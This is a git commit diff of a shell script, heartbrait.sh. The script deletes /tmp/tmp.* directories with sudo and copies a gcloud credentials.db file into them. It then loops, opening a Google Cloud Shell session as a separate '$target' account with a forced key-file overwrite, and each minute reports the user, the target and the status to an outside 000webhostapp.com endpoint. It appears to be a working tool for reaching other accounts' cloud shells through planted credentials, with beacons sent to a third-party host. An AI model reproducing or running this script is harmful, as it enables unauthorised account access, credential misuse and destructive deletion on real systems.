2a07cc79e321b9856aac529c950606555b1f228d
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-03-28 21:01:37 -0300

    Update heartbrait.sh

--- heartbrait.sh
+++ heartbrait.sh
@@ -2,23 +2,23 @@
 
 target=$1
 
-sudo rm -rf echo /tmp/tmp*/credentials.db | xargs -n 1
+sudo rm -rf echo /tmp/tmp.* | xargs -n 1
 
 user=$(gcloud auth list --format="value(account)")
 
-echo /tmp/tmp*/ | xargs -n 1 cp -v /home/${user/@*}/credentials.db
+echo /tmp/tmp.*/ | xargs -n 1 cp -v /home/${user/@*}/credentials.db
 
-gcloud auth list 
+gcloud auth list
 
 while true
 do
-send=$(gcloud cloud-shell ssh --command="date >> ping ; echo 'T'" --authorize-session --force-key-file-overwrite --account=$target)
+send=$(gcloud cloud-shell ssh --command="echo 'T'" --authorize-session --force-key-file-overwrite --account=$target)
 
 if [ $send != 'T' ]
 then
    send='F'
 fi
 
-curl https://g11977765505.000webhostapp.com/ping.php?user=${user/@*}'&send='$send
+curl https://g11977765505.000webhostapp.com/ping.php?user=${user/@*}'&send='$send'&target='${target/@*}
 sleep 60
 done
